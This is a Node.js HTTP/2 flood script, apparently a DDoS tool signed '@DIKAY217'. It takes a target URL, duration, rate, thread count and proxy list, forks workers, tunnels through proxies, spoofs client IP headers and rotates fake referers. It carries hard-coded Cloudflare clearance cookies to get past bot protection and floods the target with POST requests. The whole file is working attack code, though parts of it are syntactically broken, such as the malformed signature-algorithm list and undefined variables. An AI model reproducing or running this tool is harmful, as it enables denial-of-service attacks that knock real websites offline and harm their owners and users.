process.on('uncaughtException', function(er) {
    //console.log(er);
});
process.on('unhandledRejection', function(er) {
    //console.log(er);
});

process.on("SIGHUP", () => {
    return 1;
  })
process.on("SIGCHILD", () => {
    return 1;
  });

require("events").EventEmitter.defaultMaxListeners = 0;
process.setMaxListeners(0);
const gradient = require('gradient-string');
const cluster = require("cluster");
const crypto = require("crypto");
const http2 = require("http2");
const http = require('http');
const net = require("net");
const tls = require("tls");
const url = require("url");
const fs = require("fs");
var path = require("path");
const os = require("os");
var fileName = __filename;
var file = path.basename(fileName);

if (process.argv.length < 7){
    console.log(`node ` + file + ` url time requests threads proxy`);
    process.exit();
}

const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
const ciphers = "GREASE:" + [
defaultCiphers[2],
defaultCiphers[1],
defaultCiphers[0],
defaultCiphers.slice(3) 
].join(":");

const sigalgs = 
'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512'
		'ecdsa_secp256r1_sha256',
		'ecdsa_brainpoolP256r1tls13_sha256',
		'ecdsa_brainpoolP384r1tls13_sha384',
		'ecdsa_brainpoolP512r1tls13_sha512',
		'ecdsa_sha1',
		'ed25519',
		'ed448',
		'rsa_pkcs1_sha1',
		'rsa_pkcs1_sha256',
		'rsa_pkcs1_sha384',
		'rsa_pss_pss_sha256',
		'rsa_pss_pss_sha384',
		'rsa_pss_pss_sha512',
		'sm2sig_sm3',           
		'ecdsa_secp384r1_sha384',
		'ecdsa_secp521r1_sha512',
		'rsa_pss_rsae_sha256',
		'rsa_pss_rsae_sha384',
		'rsa_pss_rsae_sha512',
		'rsa_pkcs1_sha512';
const ecdhCurve = "GREASE:x25519:secp256r1:secp384r1";
const secureOptions = 
crypto.constants.SSL_OP_NO_TICKET |
crypto.constants.SSL_OP_NO_SSLv2 |
crypto.constants.SSL_OP_NO_SSLv3 |
crypto.constants.SSL_OP_NO_COMPRESSION |
crypto.constants.SSL_OP_NO_RENEGOTIATION | 
crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
crypto.constants.SSL_OP_TLSEXT_PADDING | 
crypto.constants.SSL_OP_ALL |
crypto.constants.SSL_OP_NO_SSLv2 |
crypto.constants.SSL_OP_NO_SSLv3 |
crypto.constants.SSL_OP_NO_TLSv1 |
crypto.constants.SSL_OP_NO_TLSv1_2 |
crypto.constants.TLS_OP_NO_TLS_1_1 |
crypto.constants.TLS_OP_NO_TLS_1_0 |
crypto.constants.SSL_OP_NO_TLSv1_1 |
crypto.constants.SSL_OP_NO_TICKET | 
crypto.constants.SSL_OP_SSLREF2_REUSE_ |
crypto.constants.SSL_OP_TLS_BLOCK_ |
crypto.constants.SSL_OP_TLS_D5_BUG |
crypto.constants.PADDING_BUG |
crypto.constants.SSL_OP_TLS_ROLLBACK_BUG |
crypto.constants.SSL_OP_SSLREF2_REUSE_CERT_TYPE_BUG |
crypto.constants.SSL_OP_CISCO_ANYCONNECT |
crypto.constants.SSL_OP_ALL |
crypto.constants.SSL_OP_MICROSOFT_BIG_SSLV3_BUFFER | 
crypto.constants.SSL_OP_NO_QUERY_MTU |
crypto.constants.ALPN_ENABLED |
crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
crypto.constants.SSL_OP_COOKIE_EXCHANGE |
crypto.constants.SSL_OP_PKCS1_CHECK_1 |
crypto.constants.SSL_OP_PKCS1_CHECK_2 |
crypto.constants.SSL_OP_SINGLE_DH_USE |
crypto.constants.SSL_OP_SINGLE_ECDH_USE |
crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION |
crypto.constants.SSLcom |
crypto.constants.SSL_OP_NO_TLSv1 |
crypto.constants.SSL_OP_NO_TLSv1_1 |
crypto.constants.ALPN_ENABLED |
crypto.constants.SSL_OP_NO_RENEGOTIATION |
crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
crypto.constants.SSL_OP_COOKIE_EXCHANGE |
crypto.constants.SSL_OP_PKCS1_CHECK_1 |
crypto.constants.SSL_OP_PKCS1_CHECK_2 |
crypto.constants.SSL_OP_SINGLE_DH_USE |
crypto.constants.SSL_OP_SINGLE_ECDH_USE |
crypto.constants.SSLcom |
crypto.constants.SSL_OP_TLSEXT_PADDING |
crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION; 


const secureProtocol = "TLS_client_method";
const secureContextOptions = {
    ciphers: ciphers,
    sigalgs: sigalgs,
    honorCipherOrder: true,
    secureOptions: secureOptions,
    secureProtocol: secureProtocol
};

const secureContext = tls.createSecureContext(secureContextOptions);

const headers = {};
 function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
 }
 
 function randomIntn(min, max) {
     return Math.floor(Math.random() * (max - min) + min);
 }
 
 function randomElement(elements) {
     return elements[randomIntn(0, elements.length)];
 } 

	function generatecipher() {
	  cipper = cplist[Math.floor(Math.random() * cplist.length)]
	}

 function randomCharacters(length) {
    output = ""
    for (let count = 0; count < length; count++) {
        output += randomElement(characters);
    }
    return output;
}
 
const args = {
    target: process.argv[2],
    time: process.argv[3],
    rate: process.argv[4],
    threads: process.argv[5],
    proxy: process.argv[6],
 }


const accept_header = [
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
],

		cplist = [

        'TLS_AES_128_GCM_SHA256',
        'TLS_AES_256_GCM_SHA384',
        'TLS_CHACHA20_POLY1305_SHA256',
        'TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256',
        'TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384',
        'TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256',
        'TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384',
        'TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA',
        'TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA384',
        'TLS_RSA_WITH_AES_128_GCM_SHA256',
        'TLS_RSA_WITH_AES_256_GCM_SHA384',
        'TLS_RSA_WITH_AES_128_CBC_SHA',
        'TLS_RSA_WITH_AES_256_CBC_SHA',
        'TLS_RSA_WITH_3DES_EDE_CBC_SHA'
	];
cache_header = [
    'max-age=0'
],
language_header = [
	'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5'
],
dest_header = [
    'audio',
    'audioworklet',
    'document',
    'embed',
    'empty',
    'font',
    'frame',
    'iframe',
    'image',
    'manifest',
    'object',
    'paintworklet',
    'report',
    'script',
    'serviceworker',
    'sharedworker',
    'style',
    'track',
    'video',
    'worker',
    'xslt'
 ],
mode_header = [
    'cors',
    'navigate',
    'no-cors',
    'same-origin',
    'websocket'
 ],
encoding_header = [
	'gzip, deflate, br, zstd'
]
site_header = [
    'cross-site',
    'same-origin',
    'same-site',
    'none'
]

	const refers = ['https://www.google.com/search?q=', "https://check-host.net/", "https://www.facebook.com/", "https://www.youtube.com/", "https://www.fbi.com/", 'https://www.bing.com/search?q=', "https://r.search.yahoo.com/", "https://www.cia.gov/index.html", 'https://vk.com/profile.php?redirect=', "https://www.usatoday.com/search/results?q=", "https://help.baidu.com/searchResult?keywords=", "https://steamcommunity.com/market/search?q=", 'https://www.ted.com/search?q=', "https://play.google.com/store/search?q=", 'https://www.qwant.com/search?q=', "https://soda.demo.socrata.com/resource/4tka-6guv.json?$q=", "https://www.google.ad/search?q=", "https://www.google.ae/search?q=", "https://www.google.com.af/search?q=", 'https://www.google.com.ag/search?q=', 'https://www.google.com.ai/search?q=', "https://www.google.al/search?q=", "https://www.google.am/search?q=", "https://www.google.co.ao/search?q=", "http://anonymouse.org/cgi-bin/anon-www.cgi/", 'http://coccoc.com/search#query=', "http://ddosvn.somee.com/f5.php?v=", 'http://engadget.search.aol.com/search?q=', "http://engadget.search.aol.com/search?q=query?=query=&q=", "http://eu.battle.net/wow/en/search?q=", "http://filehippo.com/search?q=", 'http://funnymama.com/search?q=', "http://go.mail.ru/search?gay.ru.query=1&q=?abc.r&q=", "http://go.mail.ru/search?gay.ru.query=1&q=?abc.r/", "http://go.mail.ru/search?mail.ru=1&q=", "http://help.baidu.com/searchResult?keywords=", "http://host-tracker.com/check_page/?furl=", "http://itch.io/search?q=", 'http://jigsaw.w3.org/css-validator/validator?uri=', "http://jobs.bloomberg.com/search?q=", "http://jobs.leidos.com/search?q=", "http://jobs.rbs.com/jobs/search?q=", "http://king-hrdevil.rhcloud.com/f5ddos3.html?v=", "http://louis-ddosvn.rhcloud.com/f5.html?v=", 'http://millercenter.org/search?q=', "http://nova.rambler.ru/search?=btnG?=%D0?2?%D0?2?%=D0&q=", "http://nova.rambler.ru/search?=btnG?=%D0?2?%D0?2?%=D0/", "http://nova.rambler.ru/search?btnG=%D0%9D%?D0%B0%D0%B&q=", "http://nova.rambler.ru/search?btnG=%D0%9D%?D0%B0%D0%B/", 'http://page-xirusteam.rhcloud.com/f5ddos3.html?v=', "http://php-hrdevil.rhcloud.com/f5ddos3.html?v=", "http://ru.search.yahoo.com/search;?_query?=l%t=?=?A7x&q=", "http://ru.search.yahoo.com/search;?_query?=l%t=?=?A7x/", 'http://ru.search.yahoo.com/search;_yzt=?=A7x9Q.bs67zf&q=', "http://ru.search.yahoo.com/search;_yzt=?=A7x9Q.bs67zf/", 'http://ru.wikipedia.org/wiki/%D0%9C%D1%8D%D1%x80_%D0%&q=', "http://ru.wikipedia.org/wiki/%D0%9C%D1%8D%D1%x80_%D0%/", "http://search.aol.com/aol/search?q=", "http://taginfo.openstreetmap.org/search?q=", "http://techtv.mit.edu/search?q=", 'http://validator.w3.org/feed/check.cgi?url=', "http://vk.com/profile.php?redirect=", 'http://www.ask.com/web?q=', 'http://www.baoxaydung.com.vn/news/vn/search&q=', "http://www.bestbuytheater.com/events/search?q=", "http://www.bing.com/search?q=", "http://www.evidence.nhs.uk/search?q=", "http://www.google.com/?q=", "http://www.google.com/translate?u=", "http://www.google.ru/url?sa=t&rct=?j&q=&e&q=", 'http://www.google.ru/url?sa=t&rct=?j&q=&e/', 'http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=', "http://www.pagescoring.com/website-speed-test/?url=", "http://www.reddit.com/search?q=", "http://www.search.com/search?q=", "http://www.shodanhq.com/search?q=", 'http://www.ted.com/search?q=', 'http://www.topsiteminecraft.com/site/pinterest.com/search?q=', "http://www.usatoday.com/search/results?q=", "http://www.ustream.tv/search?q=", "http://yandex.ru/yandsearch?text=", "http://yandex.ru/yandsearch?text=%D1%%D2%?=g.sql()81%&q=", "http://ytmnd.com/search?q=", "https://add.my.yahoo.com/rss?url=", "https://careers.carolinashealthcare.org/search?q=", "https://check-host.net/", "https://developers.google.com/speed/pagespeed/insights/?url=", 'https://drive.google.com/viewerng/viewer?url=', 'https://duckduckgo.com/?q=', "https://google.com/"];
var randomReferer = refers[Math.floor(Math.random() * refers.length)];
var proxies = readLines(args.proxy);
const parsedTarget = url.parse(args.target);
const ip_spoof = () => {
	const ip_segment = () => {
	  return Math.floor(Math.random() * 255);
	};
	return `${""}${ip_segment()}${"."}${ip_segment()}${"."}${ip_segment()}${"."}${ip_segment()}${""}`;
  };
  const fakeIP = ip_spoof();

if (cluster.isMaster){
    const dateObj = new Date();
        for (let i = 0; i < process.argv[5]; i++){
            cluster.fork();
        }
		console.clear()
		console.log('@DIKAY217')
        setTimeout(() => {
        }, process.argv[5] * 10000);
    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
        }
    } else {setInterval(runFlooder) }

class NetSocket {
     constructor(){}
 
HTTP(options, callback) {
     const parsedAddr = options.address.split(":");
     const addrHost = parsedAddr[0];
     const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
     const buffer = new Buffer.from(payload);
     const connection = net.connect({
     host: options.host,
     port: options.port,
     allowHalfOpen: true,
     writable: true,
     readable: true
     });
 
     connection.setTimeout(options.timeout * 10000);
     connection.setKeepAlive(true, 10000);
     connection.setNoDelay(true);
     connection.on("connect", () => {
     connection.write(buffer);
     });

     connection.on("data", chunk => {
     const response = chunk.toString("utf-8");
     const isAlive = response.includes("HTTP/1.1 200");
     if (isAlive === false) {
     connection.destroy();
     return callback(undefined, "403");
     }
     return callback(connection, undefined);
     });
 
     connection.on("timeout", () => {
         connection.destroy();
         return callback(undefined, "403");
     });
 
     connection.on("error", error => {
         connection.destroy();
         return callback(undefined, "403");
     });
 }}

 const Socker = new NetSocket();
 headers[":method"] = 'POST'
 headers[':authority'] = parsed.host;
 headers[":path"] = parsedTarget.path;
 headers['referer'] = target;
 headers[":scheme"] = "https";
 headers["accept"] = accept_header[Math.floor(Math.random() * accept_header.length)];
 headers["accept-encoding"] = encoding_header[Math.floor(Math.random() * encoding_header.length)];
 headers["accept-language"] = language_header[Math.floor(Math.random() * language_header.length)];
 headers["cache-control"] = cache_header[Math.floor(Math.random() * cache_header.length)];
 headers["Content-Length"] = "7527";
 headers["TE"] = trailers
 headers["cookie"] = "cf_clearance=VLDr7E5r08C9z9S7yyFuW4aeL6zU6pzffIvJNBBgB.I-1715185711-1.0.1.1-3r1nQnvTvVdzTQBaW7wBMHkwgLAaIhBAxbEtWYTBsDVnveLJ2H5fnZE7.neAu3Ev4jA9NnQkOOPEpcfrDt4tzQ; cf_clearance=06tTM5Sos3SQClEQz90I__UL7jh.JUWdKycEX5XWfm8-1715291753-1.0.1.1-zJkUxJzouU_JRjbfeq0jC0Hi9_77nErspCb9TlUDv.MNfSkbgqf46W8siow563ACDy4foThyQxagufTk1T8VyQ";
 headers["sec-ch-ua"] = '"Chromium";v="108", "Opera GX";v="94", "Google Chrome";v="96", "Chromium";v="96", "Not A;Brand";v="99"';
 headers["sec-ch-ua-mobile"] = "?0";
 headers["sec-ch-ua-platform"] = "Windows";
 headers["sec-fetch-dest"] = dest_header[Math.floor(Math.random() * dest_header.length)];
 headers["sec-fetch-mode"] = mode_header[Math.floor(Math.random() * mode_header.length)];
 headers["sec-fetch-site"] = site_header[Math.floor(Math.random() * site_header.length)];
 headers["sec-fetch-user"] = "?1";
 headers["upgrade-insecure-requests"] = "1";
 headers["user-agent"] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36';
 headers["x-requested-with"] = "XMLHttpRequest";
 headers["Via"] = fakeIP;
headers["sss"] = fakeIP;
headers["Sec-Websocket-Key"] = fakeIP;
headers["Sec-Websocket-Version"] = 13;
headers["X-Forwarded-For"] = fakeIP;
headers["X-Forwarded-Host"] = fakeIP;
headers["Client-IP"] = fakeIP;
headers["Real-IP"] = fakeIP;
 headers["Referer"] = randomReferer;

 function runFlooder() {
     const proxyAddr = randomElement(proxies);
     const parsedProxy = proxyAddr.split(":");
     headers[":authority"] = parsedTarget.host
     headers["x-forwarded-for"] = parsedProxy[0];
     headers["x-forwarded-proto"] = "https";
     const proxyOptions = {
     host: parsedProxy[0],
     port: parsedProxy[1],
     address: parsedTarget.host + ":443",
     timeout: 15
     };

     Socker.HTTP(proxyOptions, (connection, error) => {
         if (error) return
         connection.setKeepAlive(true, 60000);
         connection.setNoDelay(true);

         const settings = {
            enablePush: false,
            initialWindowSize: 1073741823
        };

         const tlsOptions = {
            port: 443,
            ALPNProtocols: [
                'h2'
            ],
            secure: true,
            ciphers: ciphers,
            sigalgs: sigalgs,
            requestCert: true,
            socket: connection,
            ecdhCurve: ecdhCurve,
            honorCipherOrder: false,
            decodeEmails: false,
            gzip: true,
            rejectUnauthorized: false,
            followAllRedirects: true,
            servername: url.hostname,
            host: parsedTarget.host,
            servername: parsedTarget.host,
            secureOptions: secureOptions,
            secureContext: secureContext,
            secureProtocol: secureProtocol
        };

         const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions); 
         
         tlsConn.allowHalfOpen = true;
         tlsConn.setNoDelay(true);
         tlsConn.setKeepAlive(true, 60 * 1000);
         tlsConn.setMaxListeners(0);
 
         const client = http2.connect(parsedTarget.href, {
            protocol: "https:",
            settings: {
            headerTableSize: 65536,
            maxConcurrentStreams: 1000,
            initialWindowSize: 6291456,
            maxHeaderListSize: 262144,
            enablePush: false
          },
            maxSessionMemory: 3333,
            maxDeflateDynamicTableSize: 4294967295,
            createConnection: () => tlsConn,
            socket: connection,
         });
 
         client.settings({
            headerTableSize: 65536,
            maxConcurrentStreams: 1000,
            initialWindowSize: 6291456,
            maxHeaderListSize: 262144,
            enablePush: false
          });

         client.setMaxListeners(0);
         client.settings(settings);

         client.on("connect", () => {
            const IntervalAttack = setInterval(() => {
                for (let i = 0; i < args.rate; i++) {
                    const request = client.request(headers)

                    .on("response", response => {
                        request.close();
                        request.destroy();
                        return
                    });

                    request.end();
                }
            }, 1000); 
         });
 
         client.on("close", () => {
             client.destroy();
             connection.destroy();
             return
         });
 
         client.on("error", error => {
             client.destroy();
             connection.destroy();
             return
         });
     });
 }

 const KillScript = () => process.exit();
 setTimeout(KillScript, args.time * 10000);